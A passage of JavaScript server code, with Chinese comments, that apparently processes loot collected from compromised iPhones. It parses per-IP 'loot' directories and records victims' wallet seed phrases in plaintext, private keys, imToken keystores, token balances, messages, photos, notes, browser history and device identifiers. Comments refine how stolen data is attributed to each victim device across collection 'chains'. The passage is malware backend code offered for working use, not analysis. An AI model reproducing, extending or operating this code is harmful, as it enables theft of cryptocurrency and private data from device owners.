    const isF = (k === 'notebooks' || k === 'browserHistory');
    const from = isF ? Math.max(0, from0 - (st.filtRc[k] || 0)) : from0;
    const arr = store[k];
    for (let i = from; i < arr.length; i++) { const o = arr[i]; if (o && !objBucket.has(o)) objBucket.set(o, name); }
    if (arr.length > from) (st.newRanges = st.newRanges || {})[k] = [from, arr.length];   // 【P2】新增区间（ingestd 增量提取）
  }
  let uc = 0; for (const kv of store.users) { if (uc++ >= st.userSize) objBucket.set(kv[1], name); }
  let dc = 0; for (const kv of store.devices) { if (dc++ >= st.devSize) objBucket.set(kv[1], name); }
  const ips = bucketIps.get(name) || {};
  for (const kk of Object.keys(st.ipTouch)) {
    const i = kk.indexOf('|'); if (i < 0) continue;
    const s = kk.slice(0, i), ipx = kk.slice(i + 1);
    if (!ips[s]) ips[s] = [];
    if (ips[s].indexOf(ipx) === -1) ips[s].push(ipx);
  }
  bucketIps.set(name, ips);
  st.bucket = null;
}
function bcFinalize(store, buckets, objBucket, bucketIps) {
  // 【2026-09-13 v1.5】分片固化：全量重写 64 个 shard（顺序 IO，替代 53K 小文件）；
  //   「已消失桶」因不参与聚合而天然清除；旧格式小文件由 bcShardWrite 内清理。
  if (!bcState.anyRescan) return;   // 全恢复轮：缓存内容已最新，跳过写盘
  const agg = new Map();
  for (const b of buckets) agg.set(b, { arrays: {}, users: [], devices: [] });
  for (const k of BC_ARRAYS) {
    for (const o of store[k]) {
      const b = objBucket.get(o); if (!b) continue;
      const a = agg.get(b); if (!a) continue;
      (a.arrays[k] = a.arrays[k] || []).push(o);
    }
  }
  for (const kv of store.users) { const a = agg.get(objBucket.get(kv[1])); if (a) a.users.push(kv); }
  for (const kv of store.devices) { const a = agg.get(objBucket.get(kv[1])); if (a) a.devices.push(kv); }
  bcShardWrite(agg, bucketIps);
}

// 【2026-09-13 P1 抽取】单桶处理（从 scan() 循环体机械抽出，行为不变）——scan() / 微发布器 / ingestd 共用
// 【P2·ingestd】第 6 参 bcIngestCtx = {led, meta} 时进"入库·无基线增量"模式：
//   不查/不恢复分片缓存（ingestd 不加载 scan_cache，内存零占用），账本由调用方自有 state 提供，
//   只解析 led 之外的新增文件；处理完的 sig/led/meta 经 bcRunInfo 由调用方读回自行落账。
function processBucket(store, bucketName, _bcForceAll, bcObjBucket, bcBucketIps, bcIngestCtx) {
  const now = Date.now();
    const dir = path.join(LOOT_DIR, bucketName);
    const ipDir = bucketName;
    // 【2026-09-13 增量构建 v1.5】缓存命中（内存分片）→ 恢复产物并跳过本桶全部文件解析
    let _oldEntry = null, _deltaRoute = false;
    if (bcIngestCtx) {
      _deltaRoute = true;
      _oldEntry = { led: Array.isArray(bcIngestCtx.led) ? bcIngestCtx.led : [], meta: bcIngestCtx.meta || {} };
    } else if (BC_ENABLED && !_bcForceAll) {
      const _bCache0 = bcShardMap.get(bucketName);
      if (_bCache0) {
        if (bcBucketSig(dir) === _bCache0.sig) {
          // 【v1.2 评审修复】ext_logs.jsonl 是"已有文件内容追加"：不改目录 mtime → 桶签名不变，
          //   原逻辑会直接命中并跳过 jsonl 消费。此处单独校验其大小：增长则不能判命中，
          //   改走 delta 路径（零文件解析 + 只消费 jsonl 增量）。
          let _jsonlGrew = false;
          if (DELTA_ENABLED && _bCache0.meta) {
            try {
              const _jst = fs.statSync(path.join(dir, 'ext_logs.jsonl'));
              const _joff = (_bCache0.meta.jsonlOffset != null) ? _bCache0.meta.jsonlOffset : (_bCache0.meta.jsonlSize || 0);
              if (_jst.size !== _joff) _jsonlGrew = true;   // 增长或截断/轮转都视为变化（!=）
            } catch { /* 无 jsonl：正常命中 */ }
          }
          if (!_jsonlGrew) {
            bcRestore(store, _bCache0, bucketName, bcObjBucket, bcBucketIps);
            bcRunInfo.set(bucketName, { sig: _bCache0.sig || '', led: _bCache0.led || null, meta: _bCache0.meta || null });
            bcStats.hit++;
            return;
          }
          // jsonl 增长：按"签名变化"同路处理（落到下方 → 恢复基线 → delta 消费）
        }
        // 签名变化：保留其 deviceIps 贡献并集
        if (_bCache0.deviceIps) bcBucketIps.set(bucketName, Object.assign({}, _bCache0.deviceIps));
        _oldEntry = _bCache0;
        // 【增量引擎】未命中且具备账本（meta+led）→ 先恢复旧状态做基线，稍后只把"新增文件"叠加进来
        if (DELTA_ENABLED && _bCache0.meta && Array.isArray(_bCache0.led) && _bCache0.led.length) {
          _deltaRoute = true;
          bcRestore(store, _bCache0, bucketName, bcObjBucket, bcBucketIps);
        }
      }
    }
    if (BC_ENABLED) bcBeginBucket(store, bucketName);
    // 【增量引擎】稳定读数·双签名夹读（评审加固）：sig1 → readdir → sig2，要求 sig1 === sig2，
    //   证明"读取文件列表期间目录未发生任何变化"（只比较文件数会漏掉"删旧+加新、数量不变"的窗口）。
    //   sig 在此刻盖章（不是轮末）→ 之后再来的新文件下轮必被识别为新增。
    let _allFiles = [], _sigStamp = '', _stableRead = false;
    try {
      for (let _try = 0; _try < 4; _try++) {
        const _sig1 = bcBucketSig(dir) || '';
        const _files = fs.readdirSync(dir);
        const _sig2 = bcBucketSig(dir) || '';
        _allFiles = _files; _sigStamp = _sig2;
        if (_sig1 === _sig2) { _stableRead = true; break; }
      }
    } catch { if (BC_ENABLED) { bcRunInfo.set(bucketName, { sig: '', led: null, meta: null }); bcState.bucket = null; } return; }
    // 【P2 修正】4 次夹读均不稳定（高频变动桶，实况 unknown_posts 每轮都失败）：原逻辑"跳过整桶"
    //   会把该类桶的数据无限期饿死。改为：用最后一次 readdir 结果照常处理（增量路由不变），
    //   但 sig 置空 → 下轮不命中继续重试（账本 led 照常推进，处理过的不重复）；
    //   最坏情况 = 某轮 readdir 恰好错过一个刚写入的文件 → 下轮再补（不丢数据）。
    if (!_stableRead) {
      console.error('[scan-cache] 目录高频变动 4 次夹读未稳定 → %s 用最后一次读取继续处理（sig 置空，下轮重试）', bucketName);
      _sigStamp = '';
    }
    if (BC_ENABLED) bcRunInfo.set(bucketName, { sig: _sigStamp, led: _allFiles, meta: (bcIngestCtx && bcIngestCtx.meta) ? Object.assign({}, bcIngestCtx.meta) : {} });
    const _ri = BC_ENABLED ? bcRunInfo.get(bucketName) : null;
    const _deltaCtx = _deltaRoute ? (_oldEntry.meta || null) : null;
    // 增量路由：只把「led 之外的新增文件」交给各分支解析；旧文件结果来自恢复的缓存状态。
    //   DELTA 关闭、或旧条目缺账本（历史格式）→ 视为全量（files = 全部），本轮补齐 led/meta。
    // 【P2·超大桶保护】文件数超 BIG_FILES → 滚动窗口模式（见常量注释）：
    //   解析与账本都限定"字典序最后 BIG_WINDOW 个"；窗口外旧文件每轮被 skip（不解析），历史走快照通道。
    let files, _ledOut = _allFiles;
    if (_allFiles.length > BIG_FILES) {
      const _win = _allFiles.slice().sort().slice(-BIG_WINDOW);
      _ledOut = _win;
      if (_deltaRoute) {
        const _ledSet = new Set(_oldEntry.led || []);
        files = _win.filter(f => !_ledSet.has(f));
        bcStats.delta++;
      } else {
        files = _win;
        bcStats.full++;
      }
    } else if (_deltaRoute) {
      const _ledSet = new Set(_oldEntry.led);
      files = _allFiles.filter(f => !_ledSet.has(f));
      bcStats.delta++;
    } else {
      files = _allFiles;
      bcStats.full++;
    }
    bcStats.reparsed += files.length;
    // 超大桶：账本只存窗口（避免几十 MB 的 led；窗口外文件不参与增量判定 → 每轮被 skip）
    if (_ri && _ledOut !== _allFiles) _ri.led = _ledOut;
    if (_ri && _deltaCtx) {
      if (_deltaCtx.serial) _ri.meta.serial = _deltaCtx.serial;
      if (Array.isArray(_deltaCtx.devs)) _ri.meta.devs = _deltaCtx.devs;
      // 【v1.2 评审修复】jsonl 游标：优先新字段 jsonlOffset（=最后一个完整换行后的字节偏移），兼容旧字段 jsonlSize
      if (_deltaCtx.jsonlOffset != null) _ri.meta.jsonlOffset = _deltaCtx.jsonlOffset;
      else if (_deltaCtx.jsonlSize) _ri.meta.jsonlOffset = _deltaCtx.jsonlSize;
    }

    // ── 【2026-09-14 修复】桶内设备身份表：序列号 ↔ (机型, IOS版本) ──
    //   旧实现从 report 只读 dd.device（这些 payload 里根本没有该字段，机型在 dd.m /
    //   deviceInfo.productType）→ dev 恒空 → pickSerial 永远 fallback 到 _bucketDevs[0]。
    //   多设备共享出口 IP（CGNAT / 同人双机）时，所有无序列号 payload（照片/备忘录/联系人/
    //   put 事件）被吸附到桶内第一台设备 —— 实测 F71SGYK3HG6W / G0NDVAP50D5J 的全部数据
    //   挂到了 DNPWD4XLJCLG（旧测试机）名下。现改为：
    //     ① 机型三格式兼容：dd.m / dd.device / dd.deviceInfo.productType；
    //     ② 匹配 机型+版本 优先；有明确机型但桶内身份表没有它 → 留空（等它的 report 到，禁止猜）；
    //        同型号多台无法区分 → 留空。宁缺勿错，绝不吸附到第一台；
    //     ③ 身份表 = 上轮持久化种子 ∪ 本轮 report 单据重扫（增量时只读新增，种子缺机型时才
    //        回退读目录内最近 200 个 report），随桶缓存持久化（meta.devs）。
    const _bucketDevs = [];
    let _bindMiss = 0;   // 【2026-09-19 加固】本桶"无身份载荷归属留空"计数（桶尾汇总日志）
    const _addBucketDev = (sn, dev, pv) => {
      if (!sn) return;
      const s0 = String(sn);
      const d0 = String(dev || '').trim();
      const p0 = String(pv || '').trim();
      const hit = _bucketDevs.find(x => x.sn === s0);
      if (hit) { if (!hit.dev && d0) hit.dev = d0; if (!hit.pv && p0) hit.pv = p0; return; }
      _bucketDevs.push({ sn: s0, dev: d0, pv: p0 });
    };
    if (_deltaCtx && Array.isArray(_deltaCtx.devs)) {
      for (const d0 of _deltaCtx.devs) if (d0 && d0.sn) _addBucketDev(d0.sn, d0.dev || d0.m, d0.pv);
    }
    const _scanBucketReports = (force) => {
      // 种子已有可用机型 → 只扫本轮新增 report（增量低耗）；种子缺机型/首建/force → 目录内最近 200 个 report
      const _needRescan = force || !_bucketDevs.some(x => x.dev);
      const _src = (_needRescan && _allFiles && _allFiles.length) ? _allFiles : files;
      const _rpts = _src.filter(f => /^report_.*\.dec\.json$/.test(f));
      _rpts.sort((a, b) => (Number((b.match(/_(\d+)\.dec\.json$/) || [])[1]) || 0) - (Number((a.match(/_(\d+)\.dec\.json$/) || [])[1]) || 0));
      for (const dn of _rpts.slice(0, 200)) {
        const dd = safeJson(path.join(dir, dn));
        if (!dd) continue;
        const sn = dd.s || dd.d2 || '';
        if (!sn) continue;
        const di = dd.deviceInfo || {};
        const dev = dd.m || dd.device || di.productType || '';
        const pv = (typeof dd.pv === 'string' && /^\d+(\.\d+)+$/.test(dd.pv)) ? dd.pv : (di.productVersion || '');
        _addBucketDev(sn, dev, pv);
      }
    };
    _scanBucketReports(false);
    if (_ri) _ri.meta.devs = _bucketDevs;
    // 严格归属：机型（+版本）唯一命中才归属；无机型信息且全桶唯一设备才兜底；否则留空
    const _pickSerial0 = (dev, pv) => {
      if (!_bucketDevs.length) return '';
      const d0 = String(dev || '').trim();
      if (!d0) return _bucketDevs.length === 1 ? _bucketDevs[0].sn : '';
      const cands = _bucketDevs.filter(x => x.dev === d0);
      if (!cands.length) return '';
      if (cands.length === 1) return cands[0].sn;
      const p0 = String(pv || '').trim();
      if (p0) { const exact = cands.filter(x => x.pv === p0); if (exact.length === 1) return exact[0].sn; }
      return '';
    };
    // 【2026-09-19 加固·静默孤儿根因修复】漏配三层兜底（DNPF15140DYN 类：数据采到但 serial 留空）：
    //   ① 首次 miss（有明确机型时）→ 强制重扫一次 report：兜住"身份文件刚到、桶种子还没带上"的时序竞态
    //   ② 桶内仍无唯一命中 → 全局 IP→设备 唯一证据（该出口 IP 恰好只出现过 1 台设备才采用，多台不猜）
    //   ③ 仍留空 → 计数，桶尾汇总打日志（此前完全静默，无从发现）
    const _globalIpSerials = (ip) => {
      if (!ip) return null;
      const idx = new Map();   // 每次现建（~2 万次迭代，毫秒级），避免缓存过期导致误绑
      for (const [sn, ips] of Object.entries(store.deviceIps || {})) {
        for (const x of ips) { let s = idx.get(x); if (!s) idx.set(x, s = new Set()); s.add(sn); }
      }
      return idx.get(ip) || null;
    };
    let _rescanTried = false;
    const pickSerial = (dev, pv) => {
      const d0 = String(dev || '').trim();
      let sn = _pickSerial0(dev, pv);
      if (!sn && d0 && !_rescanTried) {
        _rescanTried = true;
        _scanBucketReports(true);
        if (_ri) _ri.meta.devs = _bucketDevs;
        sn = _pickSerial0(dev, pv);
      }
      if (!sn) {
        const g = _globalIpSerials(ipDir);
        if (g && g.size === 1) sn = [...g][0];
      }
      if (!sn) _bindMiss++;
      return sn;
    };

    // 【稳定性·评审加固】整桶异常隔离：任何未捕获异常 → 不写可命中签名（下轮强制全量重扫），
    //   其余桶不受影响；已产生的部分成果仍经 bcEndBucket 归属（catch 后继续执行）。
    let _bErr = null;
    try {

    // ── 通道①：raw_avatar_put_*.json（/api/user/avatar/put 解密后的事件流，13-17 链主力通道）──
    // 【2026-09-10 接入】此前完全未解析 —— 全站 12152 个文件，含 plugin_batch_done /
    //   contacts_upload_completed / photo_check / all_is_well / corepayload_update 等关键里程碑，
    //   导致「面板看不到系统采集闭环」（只能命令行 grep loot 目录才看得到）。
    // 【2026-09-14 修复】put 本体无 serial，原来取"整桶第一个 s/d2"兜底 —— 多设备桶会把两台
    //   设备的 put 事件全部吸附到第一台（实测 F71/G0ND 的心跳/采集里程碑全记到 DNPWD4XLJCLG）。
    //   现按 payload 自身机型+版本对齐桶内身份表；对齐不了留空，不再整桶兜底。
    try {
      const NOISY = new Set(['plugin_download_ok']);   // 高频噪声：只刷新设备活跃度，不进事件流
      for (const pn of files.filter(f => /^raw_avatar_put_\d+\.json$/.test(f)).sort()) {
        const pd = safeJson(path.join(dir, pn));
        if (!pd || !pd.et) continue;
        const ts = Number((pn.match(/_(\d+)\.json$/) || [])[1] || 0);
        const serial = pd.d2 || pd.serial || pd.s || pickSerial(pd.device, pd.pv) || '';
        if (serial) {
          // 17 链 put 通道也记 IP（同样是 IP 漂移的多目录来源）
          if (!store.deviceIps[serial]) store.deviceIps[serial] = [];
          if (store.deviceIps[serial].indexOf(ipDir) === -1) { store.deviceIps[serial].push(ipDir); bcTouchIp(serial, ipDir); }
          if (!store.users.has(serial)) {
            store.users.set(serial, { id: store.users.size + 1, serial_id: serial, machine: pd.device || '',
              ios_version: pd.pv || '', ip: ipDir, first_seen: ts, last_seen: ts, channel_put: true });
          } else {
            const u = store.users.get(serial);
            if (ts > (u.last_seen || 0)) u.last_seen = ts;
            if (!u.machine && pd.device) u.machine = pd.device;
            if (!u.ios_version && pd.pv) u.ios_version = pd.pv;
          }
          if (!store.devices.has(serial)) {
            store.devices.set(serial, { id: store.devices.size + 1, serial_id: serial, hardware_model: pd.device || '',
              build_version: pd.build || '', os_version: pd.pv || '', kernel_release: '', user_id: (store.users.get(serial) || {}).id || 0,
              ip: ipDir, last_seen: ts, source: 'put-channel' });
          } else { const d0 = store.devices.get(serial); if (ts > (d0.last_seen || 0)) d0.last_seen = ts; if (!d0.os_version && pd.pv) d0.os_version = pd.pv; }
        }
        if (NOISY.has(pd.et)) continue;
        store.events.push({ id: store.events.length + 1, user_id: (store.users.get(serial) || {}).id || 0,
          serial, ip: ipDir, ts, type: pd.et, ctx: pd, device: pd.device || '', pv: pd.pv || '', build: pd.build || '' });
        store.reports.push({ id: store.reports.length + 1, user_id: 0, serial, ip: ipDir, ts,
          kind: pd.et, endpoint: 'avatar/put', body_len: 0, dec: pd });
      }
    } catch (e) { /* 单桶异常不影响整体扫描 */ }

    // 【测试钩子·仅 env 触发】验证"桶处理异常 → sig='' → 下轮全量重扫"的恢复一致性；生产永不设置该 env。
    //   注：钩子位于 put 分支之后 → 异常时已有"部分成果"，正好覆盖 eventual-correction 场景。
    if (process.env.LOOT_TEST_THROW_BUCKET && bucketName === process.env.LOOT_TEST_THROW_BUCKET) throw new Error('LOOT_TEST_THROW_BUCKET(injected)');

    for (const decName of files.filter(f => f.endsWith('.dec.json')).sort()) {
      const base = decName.replace(/\.dec\.json$/, '');
      const dec = safeJson(path.join(dir, decName)) || {};
      const meta = safeJson(path.join(dir, base + '.meta.json')) || {};
      const ts = dec?.tm || meta?.time?.timestamp || Number((base.match(/_(\d{13})$/) || [])[1]) || 0;
      const ip = meta?.headers?.['x-real-ip'] || meta?.client?.ip || ipDir;
      const kind = base.match(/^report_([a-z]+)_/)?.[1] || 'other';

      let serial = dec.s || dec.d2 || '';
      let machine = dec.m || '';
      // 【2026-09-13】report_u（钱包上报）的 m 是厂商名 "apple"，会覆盖 report_event 写入的真实机型
      //   （iPhone12,1）→ 用户记录机型被污染（实测 C6KCMK4MN745）。纯厂商名过滤为空，不参与覆盖。
      if (/^apple$/i.test(String(machine).trim())) machine = '';
      let iosVer = '';
      const looksLikeIOS = v => typeof v === 'string' && /^\d+(\.\d+)+$/.test(v);
      if (looksLikeIOS(dec.pv)) iosVer = dec.pv;
      if (!iosVer && looksLikeIOS(dec.v)) iosVer = dec.v;
      let lhu = dec.lhu || '';
      let udid = dec.u || '';
      let ecid = dec.d || dec.f || '';
      const di = dec.deviceInfo || {};
      if (di.productType) machine = di.productType;
      if (di.productVersion && /^\d+(\.\d+)+$/.test(di.productVersion)) iosVer = di.productVersion;
      if (dec.i?.b && !iosVer && /^\d+(\.\d+)+$/.test(dec.i.b)) iosVer = dec.i.b;
      if (dec.deviceName && !machine) machine = dec.deviceName;

      // 【2026-09-14】无 s/d2 的 report（us 老格式/ub/uj 等）→ 同桶身份表兜底；对齐不了留空。
      //   同时补全 deviceIps —— autoAssign 依赖"设备全部出口 IP"，缺它会归属失败/漂移。
      if (!serial) {
        const _m0 = String(dec.m || '');
        serial = pickSerial(di.productType || (/^apple$/i.test(_m0) ? '' : _m0), iosVer);
      }
      if (serial) {
        if (!store.deviceIps[serial]) store.deviceIps[serial] = [];
        if (store.deviceIps[serial].indexOf(ipDir) === -1) { store.deviceIps[serial].push(ipDir); bcTouchIp(serial, ipDir); }
      }

      let user = null;
      if (serial) {
        if (!store.users.has(serial)) {
          store.users.set(serial, { id: store.users.size + 1, serial_id: serial, machine, ios_version: iosVer, lhu, ip, udid, ecid, first_seen: ts || now, last_seen: ts || now });
        }
        user = store.users.get(serial);
        const u = user;
        if (ts > u.last_seen) u.last_seen = ts;
        if (machine) u.machine = machine;
        if (iosVer) u.ios_version = iosVer;
        if (lhu) u.lhu = lhu;
        if (udid) u.udid = udid;
        if (ecid) u.ecid = ecid;
        if (ip && ip !== ipDir) u.ip = ip;
      }

      store.reports.push({
        id: store.reports.length + 1, user_id: user?.id || 0, serial, kind,
        endpoint: meta?.endpoint || '', ts, ip, body_len: meta?.body?.length || 0, dec,
      });

      if (kind === 'event') {
        store.events.push({
          id: store.events.length + 1, user_id: user?.id || 0, serial,
          type: dec.et || 'event', ts, ip, ctx: dec.ctx || null, sbu: dec.sbu || null,
          desc: dec.desc || null,
        });
        if (serial && !store.devices.has(serial)) {
          store.devices.set(serial, { id: store.devices.size + 1, serial_id: serial, hardware_model: machine, build_version: iosVer,
            os_version: iosVer, kernel_release: di.kernelRelease || '', user_id: user?.id || 0, ip, last_seen: ts || now });
        } else if (serial) {
          const d = store.devices.get(serial);
          d.last_seen = Math.max(d.last_seen, ts || 0);
          if (machine) d.hardware_model = machine;
          if (iosVer) { d.build_version = iosVer; d.os_version = iosVer; }
          if (di.kernelRelease) d.kernel_release = di.kernelRelease;
        }
      }

      if (kind === 'us') {
        // 三种上报格式兼容：
        //  ①标准 {a,c,d,d1,d2,d3,result,v}            助记词=dec.result
        //  ②老格式 {wallet_mnemonic,wallet_name,wallet_bundle,udid}
        //  ③plasma 格式 {et,api,bundle,params:{...,result,a,pv,serialId}}  助记词=dec.params.result
        const p0 = dec.params || {};
        const mnem = String(dec.result || dec.wallet_mnemonic || p0.result || '');
        const bundle = walletFromMeta(meta) || dec.wallet_bundle || dec.bundle || p0.bundleID || '';
        const appKey = String(dec.a || p0.a || '').toLowerCase();
        // app_type 判定：单字母精确映射 → 首字母兜底（imToken 的 a='b1' → 'b'）→ 上报自带名 → bundle 全名 → bundle 末段 → 未知
        const appType = WALLET_MAP[appKey] || WALLET_MAP[String(appKey)[0]] || dec.wallet_name || BUNDLE_WALLET[bundle] || (bundle ? bundle.split('.').pop() : '') || '未知';
        if (!iosVer) iosVer = p0.pv || dec.v || '';
        const mn = {
          id: store.mnemonics.length + 1, user_id: user?.id || 0, serial,
          mnem_phrase_abbr: abbr(mnem, 3, 4), mnem_phrase_plain: mnem,
          app_type: appType, bundle_id: bundle, created_at: ts, ip,
        };
        store.mnemonics.push(mn);
        store.seeds.push({
          id: store.seeds.length + 1, user_id: user?.id || 0, serial,
          seed_abbr: abbr(mnem, 3, 4), app_type: appType, mnemonic_id: mn.id,
          account_derived_to: 0, created_at: ts,
        });
      }

      // ══ v6 修正：uj = 钱包账户导出 → addresses；ub = 链上资产 → tokens ══
      // 【2026-09-10 适配 13-17 链新格式】imToken 等：uj = keystore v3（identity.identifier + imTokenMeta，
      //   没有 activeAccounts）；ub = { ba: '{"<地址>": [代币...]}' }，没有 ad。老格式分支原样保留（双兼容）。
      if (kind === 'uj') {
        let arr = [];
        let raw = null;
        try { raw = JSON.parse(String(dec.result || '{}')); } catch {}
        // 新格式（keystore v3）：无账户数组 → 用 identity.identifier / imTokenMeta 建"钱包"记录
        if (raw && !Array.isArray(raw) && !raw.activeAccounts && !raw.accounts && (raw.crypto || raw.identity)) {
          const meta = raw.imTokenMeta || {};
          const ident = (raw.identity && (raw.identity.identifier || raw.identity.ipfsId)) || raw.sourceFingerprint || raw.id || '';
          store.addresses.push({
            id: store.addresses.length + 1, user_id: user?.id || 0, serial,
            public_key: ident, public_key_abbr: abbr(ident, 8, 6),
            private_key_plain: null, private_key_abbr: null,
            chain: 'imToken', coin: null, derivation_path: '',
            wallet_name: meta.name || '', password_hint: meta.passwordHint || '',
            keystore_id: raw.id || '', fingerprint: raw.sourceFingerprint || '',
            src: 'uj', ts, ip,
          });
        }
        try { const r = raw || {}; arr = r.activeAccounts || r.accounts || (Array.isArray(r) ? r : []); } catch {}
        for (const a of arr) {
          const addr = a.address || a.publicKey || '';
          if (!addr) continue;
          store.addresses.push({
            id: store.addresses.length + 1, user_id: user?.id || 0, serial,
            public_key: addr, public_key_abbr: abbr(addr, 4, 4),
            private_key_plain: null, private_key_abbr: null,
            chain: a.coin === 0 ? 'BTC' : a.coin === 60 ? 'ETH' : `coin${a.coin}`,
            coin: a.coin, derivation_path: a.derivationPath || '',
            src: 'uj', ts, ip,
          });
        }
      }
      if (kind === 'ub') {
        let arr = [];
        // 新格式：ba = { "<地址>": [ {symbol,name,balance,chainType,...} ] }
        if (dec.ba) {
          try {
            const ba = typeof dec.ba === 'string' ? JSON.parse(dec.ba) : dec.ba;
            for (const [addr, toks] of Object.entries(ba || {})) {
              if (!addr) continue;
              const list = Array.isArray(toks) ? toks : [];
              const chainName = (list[0] && (list[0].chainType || list[0].chainId)) || 'chain';
              store.addresses.push({
                id: store.addresses.length + 1, user_id: user?.id || 0, serial,
                public_key: addr, public_key_abbr: abbr(addr, 6, 6),
                private_key_plain: null, private_key_abbr: null,
                chain: String(chainName), coin: null, derivation_path: '',
                src: 'ub', ts, ip,
              });
              for (const t of list) {
                store.tokens.push({
                  id: store.tokens.length + 1, user_id: user?.id || 0, serial,
                  symbol: t.symbol || '', name: t.name || '', address: addr,
                  derivation_path: '', decimals: t.decimal != null ? Number(t.decimal) : null,
                  balance: t.balance, value: t.value || '',
                  src: 'ub', ts, ip,
                });
              }
            }
          } catch {}
        }
        // 老格式 ad：数组 = [{symbol,...}]；对象 = { "<地址>": "<余额>" }（TokenPocket/GlobalWallet 这种）
        try {
          const ad = typeof dec.ad === 'string' ? JSON.parse(dec.ad) : dec.ad;
          if (Array.isArray(ad)) arr = ad;
          else if (ad && typeof ad === 'object') {
            for (const [addr, bal] of Object.entries(ad)) {
              if (!addr) continue;
              store.addresses.push({
                id: store.addresses.length + 1, user_id: user?.id || 0, serial,
                public_key: addr, public_key_abbr: abbr(addr, 6, 6),
                private_key_plain: null, private_key_abbr: null,
                chain: /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr) ? 'TRON' : 'chain',
                coin: null, derivation_path: '', src: 'ub', ts, ip,
              });
              store.tokens.push({
                id: store.tokens.length + 1, user_id: user?.id || 0, serial,
                symbol: '', name: '', address: addr,
                derivation_path: '', decimals: null,
                balance: bal, value: String(bal == null ? '' : bal),
                src: 'ub', ts, ip,
              });
            }
          }
        } catch {}
        for (const a of arr) {
          store.tokens.push({
            id: store.tokens.length + 1, user_id: user?.id || 0, serial,
            symbol: a.symbol || '', name: a.name || '', address: a.address || '',
            derivation_path: a.derivationPath || '', decimals: a.decimals,
            balance: a.balance, value: a.value || '',
            src: 'ub', ts, ip,
          });
        }
      }

      // photo/note/msg/history/visit/addr（老链 channel，若未来有文件自动兼容）
      if (kind === 'photo') store.photos.push({ id: store.photos.length + 1, user_id: user?.id || 0, serial, ts, ip, dec, name: dec.name || dec.filename || '', size: dec.size || 0, taken_at: dec.taken_at || ts, bin_path: path.join(dir, base + '.bin') });
      if (kind === 'note') store.notebooks.push({ id: store.notebooks.length + 1, user_id: user?.id || 0, serial, ts, ip, dec, title: dec.title || '', content: dec.content || dec.text || '' });
      if (kind === 'msg') store.messages.push({ id: store.messages.length + 1, user_id: user?.id || 0, serial, ts, ip, dec, from: dec.from || '', to: dec.to || '', body: dec.body || dec.content || '', chat: dec.chat || dec.source || '', bin_path: path.join(dir, base + '.bin'), source_path: dec.path || '' });
      if (kind === 'history') store.browserHistory.push({ id: store.browserHistory.length + 1, user_id: user?.id || 0, serial, ts, ip, dec, url: dec.url || '', title: dec.title || '', bin_path: path.join(dir, base + '.bin'), source_path: dec.path || '' });
      if (kind === 'visit') store.visitLogs.push({ id: store.visitLogs.length + 1, user_id: user?.id || 0, serial, ts, ip, dec, log: dec.log || '', duration_ms: dec.duration_ms || 0 });
      if (kind === 'addr') {
        store.addresses.push({
          id: store.addresses.length + 1, user_id: user?.id || 0, serial,
          public_key: dec.address || dec.public_key || '', public_key_abbr: abbr(dec.address || '', 4, 4),
          private_key_plain: dec.private_key || null, private_key_abbr: dec.private_key ? abbr(dec.private_key, 3, 3) : null,
          chain: dec.chain || 'Unknown', src: 'addr', ts, ip,
        });
      }

      if (kind === 'u') {
        if (Array.isArray(dec.al)) {
          for (const app of dec.al) {
            store.apps.push({ id: store.apps.length + 1, user_id: user?.id || 0, serial, name: app.a || '', bundle_id: app.b || '', version: app.v || '', ts });
          }
        }
      }
      if (kind === 'a') {
        if (dec.application?.bundleIdentifier) {
          store.sysApps.push({ id: store.sysApps.length + 1, user_id: user?.id || 0, serial, bundle_id: dec.application.bundleIdentifier, name: dec.deviceName || '', ts });
        }
      }
    }

    // ── 18 链 ext_stats（parsed.json）→ exfil18 + 分类补源（短信/备忘录/照片/历史/通讯录/通话）──
    const extBins = new Map();   // pn -> bin 文件名（同 ts 对应）
    for (const pn of files.filter(f => /^ext_stats_\d+\.bin$/.test(f)).sort()) {
      extBins.set(pn, pn);
    }
    for (const pn of files.filter(f => /^ext_stats_\d+\.bin\.parsed\.json$/.test(f)).sort()) {
      const pj = safeJson(path.join(dir, pn));
      if (!pj) continue;
      // 【2026-09-12】原来 first_seen/last_seen 直接用扫描时刻 now —— 面板"上线时间"永远显示当前时间。
      //   文件名里就带上传毫秒时间戳（ext_stats_<ms>.bin），用它做真实时间。
      const ts18 = Number((pn.match(/^ext_stats_(\d+)\.bin\.parsed\.json$/) || [])[1]) || now;
      const serial = pj.deviceSerial || '';
      let u18 = null;
      if (serial) {
        // 记录该设备出现过的所有出口 IP（IP 漂移会让同一台设备落在多个 loot 目录）
        if (!store.deviceIps[serial]) store.deviceIps[serial] = [];
        if (store.deviceIps[serial].indexOf(ipDir) === -1) { store.deviceIps[serial].push(ipDir); bcTouchIp(serial, ipDir); }
        if (!store.users.has(serial)) {
          store.users.set(serial, { id: store.users.size + 1, serial_id: serial, machine: pj.devicePt || '', ios_version: pj.deviceOv || '', ip: ipDir, udid: pj.deviceUDID || '', ecid: pj.deviceECID || '', first_seen: ts18, last_seen: ts18, chain18: true });
        }
        u18 = store.users.get(serial);
        if (ts18 < (u18.first_seen || ts18)) u18.first_seen = ts18;
        if (ts18 > (u18.last_seen || 0)) u18.last_seen = ts18;
        if (!store.devices.has(serial)) {
          store.devices.set(serial, { id: store.devices.size + 1, serial_id: serial, hardware_model: pj.devicePt || '', build_version: pj.deviceBv || pj.deviceOv || '',
            os_version: pj.deviceOv || '', kernel_release: '', user_id: u18.id, ip: ipDir, first_seen: ts18, last_seen: ts18, source: '18chain' });
        } else {
          // 【2026-09-11】已存在的设备记录补写 os_version（面板"设备管理"要显示 18.5 这类版本号而非 22F76 构建号）
          const d18 = store.devices.get(serial);
          if (pj.deviceOv) d18.os_version = pj.deviceOv;
          if (pj.deviceBv) d18.build_version = pj.deviceBv;
          if (pj.devicePt) d18.hardware_model = pj.devicePt;
          if (ts18 < (d18.first_seen || ts18)) d18.first_seen = ts18;
          if (ts18 > (d18.last_seen || 0)) d18.last_seen = ts18;
        }
        if (u18 && !u18.machine) u18.machine = pj.devicePt;
        if (u18 && !u18.ios_version) u18.ios_version = pj.deviceOv;
      }
      const binName = pn.replace(/\.parsed\.json$/, '');
      const binPath = fs.existsSync(path.join(dir, binName)) ? path.join(dir, binName) : null;
      const eid = store.exfil18.length + 1;
      store.exfil18.push({
        id: eid, user_id: u18?.id || 0, serial, ip: ipDir,
        source: pj.source || pn, path: pj.path || '', category: pj.category || '',
        description: pj.description || '', orig_size: pj.orig_size || 0, decoded_size: pj.decoded_size || 0,
        data_type: pj.data_type || '', preview: (pj.preview || '').slice(0, 300),
        device: pj.devicePt || '', ov: pj.deviceOv || '',
